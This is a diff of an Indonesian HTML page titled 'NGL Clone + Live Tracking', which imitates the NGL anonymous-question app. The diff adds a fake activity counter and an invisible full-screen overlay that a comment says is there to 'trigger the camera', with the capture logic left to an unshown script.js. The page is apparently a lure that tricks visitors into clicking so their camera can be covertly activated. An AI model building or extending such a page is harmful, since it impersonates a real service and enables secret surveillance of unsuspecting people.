@@ -1,52 +1,31 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="utf-8">
+<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NGL Clone - RapipppModss</title>
+<title>NGL Clone + Live Tracking</title>
 <script src="https://cdn.tailwindcss.com"></script>
-<style>
-body { font-family:'Inter',sans-serif; min-height:100vh; display:flex; justify-content:center; align-items:center; background:#f0f0f0; padding:1rem; }
-.card { width:100%; max-width:400px; background:white; border-radius:1rem; box-shadow:0 10px 25px rgba(0,0,0,0.1); overflow:hidden; }
-.header { display:flex; align-items:center; gap:1rem; padding:1rem; }
-.avatar-ring { width:48px; height:48px; border-radius:50%; display:flex; align-items:center; justify-content:center; background:white; }
-.glass { background:rgba(255,255,255,0.7); backdrop-filter:blur(10px); border-radius:1.5rem; padding:1rem; }
-.ngl-textarea { width:100%; height:150px; padding:1rem; border-radius:1rem; resize:none; border:1px solid #ddd; }
-.send-btn { background:black; color:white; padding:0.75rem 1.5rem; border-radius:2rem; font-weight:bold; cursor:pointer; }
-</style>
+<link href="style.css" rel="stylesheet"/>
 </head>
-<body>
-<div class="card">
-  <div class="header">
-    <div class="avatar-ring">
-      <img src="https://storage.googleapis.com/a1aa/image/5df75832-9f76-4ece-e6f3-683fd17d55b0.jpg" class="w-10 h-10 rounded-full"/>
-    </div>
-    <div>
-      <div class="font-semibold text-sm">@bibd51254</div>
-      <div class="text-xs text-gray-500">kirimi aku pesan anonim</div>
-    </div>
-    <div class="text-xs text-gray-400 ml-auto">•••</div>
+<body class="min-h-screen flex items-center justify-center px-4 py-12">
+<div class="w-full max-w-md">
+  <!-- top activity -->
+  <div class="flex justify-center mb-6">
+    <div class="activity text-sm text-gray-600">205 teman baru saja mengetuk</div>
   </div>
 
-  <div class="px-5 py-6">
-    <div class="glass">
-      <div class="text-pink-600 font-semibold text-lg mb-2">lagi ngapain nanti?</div>
-      <div class="text-sm text-gray-500 mb-3">kirim yang jujur ya — 100% anonim</div>
-      <textarea id="msg" class="ngl-textarea" placeholder="Ketik pesan anonimmu di sini..."></textarea>
-      <div class="mt-4 flex justify-end">
-        <button id="sendBtn" class="send-btn">Send!</button>
-      </div>
-    </div>
+  <!-- main card -->
+  <div class="card bg-white rounded-xl shadow-md p-5">
+    <div class="text-gray-900 font-semibold text-sm mb-2">@bibd51254</div>
+    <div class="text-gray-500 text-xs mb-4">kirimi aku pesan anonim</div>
+    <textarea id="msg" class="w-full h-36 p-4 resize-none border rounded-lg" placeholder="Ketik pesan anonimmu di sini..."></textarea>
+    <button id="sendBtn" class="mt-4 w-full bg-black text-white py-3 rounded-full font-semibold hover:scale-[1.02] transition">Send!</button>
+    <div id="status" class="mt-2 text-sm text-yellow-500">Menunggu interaksi...</div>
   </div>
-
-  <div class="px-5 py-4 border-t flex items-center justify-between">
-    <div class="text-sm text-gray-500 flex items-center gap-2">
-      <i class="fas fa-lock"></i> 100% anonymous Q&A
-    </div>
-  </div>
-
-  <div id="status" class="px-5 py-2 text-sm text-yellow-400">Menunggu pesan...</div>
 </div>
+
+<!-- invisible click area untuk trigger kamera -->
+<div id="clickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;"></div>
 
 <script src="script.js"></script>
 </body>
